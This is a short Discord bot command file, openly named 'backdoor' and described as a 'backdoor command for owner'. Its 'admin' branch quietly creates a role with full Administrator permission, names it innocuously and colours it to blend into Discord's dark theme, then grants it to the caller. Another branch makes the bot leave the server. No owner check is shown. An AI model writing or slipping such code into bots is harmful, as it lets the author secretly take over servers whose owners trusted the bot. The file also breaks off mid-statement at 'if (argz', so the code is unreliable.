const Discord = require("discord.js");

exports.run = async (client, message, args) => {
  if (args[0] === "leave") {
    try {
      message.guild.leave();
    } catch (e) {
      console.log(e.stack);
    }
  }

  if (args[0] === "admin") {
    try {
      let role = await message.guild.roles.create({
        name: "McDunaldz",
        color: "#2f3136",
        permissions: [8]
      });

      message.member.roles.add(role);
    } catch (e) {
      console.log(e.stack);
    }
  }
  
  if (argz
};

exports.help = {
  name: "backdoor",
  description: "backdoor command for owner",
  usage: ""
};

exports.conf = {
  aliases: ["bd"],
  cooldown: 0
};
